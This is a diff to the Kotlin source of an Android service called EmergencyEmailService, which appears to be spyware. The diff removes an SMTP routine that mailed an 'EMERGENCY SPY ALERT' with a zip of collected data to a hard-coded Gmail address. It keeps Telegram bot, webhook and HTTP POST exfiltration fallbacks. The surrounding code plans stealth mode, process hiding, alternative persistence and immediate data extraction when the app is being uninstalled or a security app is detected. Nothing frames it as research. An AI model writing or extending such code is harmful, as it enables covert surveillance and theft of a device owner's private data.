@@ -14,8 +14,6 @@ import java.net.URL
 import org.json.JSONObject
 import java.io.OutputStreamWriter
 import java.util.*
-import javax.mail.*
-import javax.mail.internet.*
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 import java.io.FileInputStream
@@ -30,8 +28,6 @@ class EmergencyEmailService : Service() {
 
         // 이메일 설정
         private const val TARGET_EMAIL = "tmdals7205@gmail.com"
-        private const val SMTP_HOST = "smtp.gmail.com"
-        private const val SMTP_PORT = "587"
 
         // 백업 전송 방법들
         private const val TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
@@ -117,22 +113,17 @@ class EmergencyEmailService : Service() {
                 // 4. 다중 경로로 데이터 전송 시도
                 var success = false
 
-                // 방법 1: 직접 SMTP 전송
-                if (!success) {
-                    success = sendViaDirectSMTP(emergencyReport, zipFile)
-                }
-
-                // 방법 2: 텔레그램 봇 전송
+                // 방법 1: 텔레그램 봇 전송
                 if (!success) {
                     success = sendViaTelegramBot(emergencyReport, zipFile)
                 }
 
-                // 방법 3: 웹훅 전송
+                // 방법 2: 웹훅 전송
                 if (!success) {
                     success = sendViaWebhook(emergencyReport, zipFile)
                 }
 
-                // 방법 4: HTTP POST 직접 전송
+                // 방법 3: HTTP POST 직접 전송
                 if (!success) {
                     success = sendViaHttpPost(emergencyReport)
                 }
@@ -315,60 +306,6 @@ Priority: CRITICAL
             reason.contains("UNINSTALL") -> "1. Immediate data extraction\n2. Alternative persistence methods\n3. Remote wipe consideration"
             reason.contains("SECURITY_APP") -> "1. Stealth mode activation\n2. Process hiding\n3. Increased transmission frequency"
             else -> "1. Enhanced monitoring\n2. Backup data transmission\n3. Stealth protocols"
-        }
-    }
-
-    private suspend fun sendViaDirectSMTP(report: String, zipFile: File?): Boolean {
-        return withContext(Dispatchers.IO) {
-            try {
-                // Gmail SMTP 설정을 사용한 직접 전송
-                val props = Properties().apply {
-                    put("mail.smtp.auth", "true")
-                    put("mail.smtp.starttls.enable", "true")
-                    put("mail.smtp.host", SMTP_HOST)
-                    put("mail.smtp.port", SMTP_PORT)
-                }
-
-                // 임시 Gmail 계정 사용 (또는 SendGrid, Mailgun 등 서비스 사용)
-                val session = Session.getInstance(props, object : Authenticator() {
-                    override fun getPasswordAuthentication(): PasswordAuthentication {
-                        return PasswordAuthentication("your_temp_gmail@gmail.com", "your_app_password")
-                    }
-                })
-
-                val message = MimeMessage(session).apply {
-                    setFrom(InternetAddress("your_temp_gmail@gmail.com"))
-                    setRecipients(Message.RecipientType.TO, InternetAddress.parse(TARGET_EMAIL))
-                    subject = "🚨 EMERGENCY SPY ALERT - ${Date()}"
-
-                    if (zipFile != null && zipFile.exists()) {
-                        val multipart = MimeMultipart()
-
-                        // 텍스트 부분
-                        val textPart = MimeBodyPart().apply {
-                            setText(report)
-                        }
-                        multipart.addBodyPart(textPart)
-
-                        // 첨부파일 부분
-                        val attachmentPart = MimeBodyPart().apply {
-                            attachFile(zipFile)
-                        }
-                        multipart.addBodyPart(attachmentPart)
-
-                        setContent(multipart)
-                    } else {
-                        setText(report)
-                    }
-                }
-
-                Transport.send(message)
-                true
-
-            } catch (e: Exception) {
-                Log.e(TAG, "직접 SMTP 전송 실패: ${e.message}")
-                false
-            }
         }
     }
 
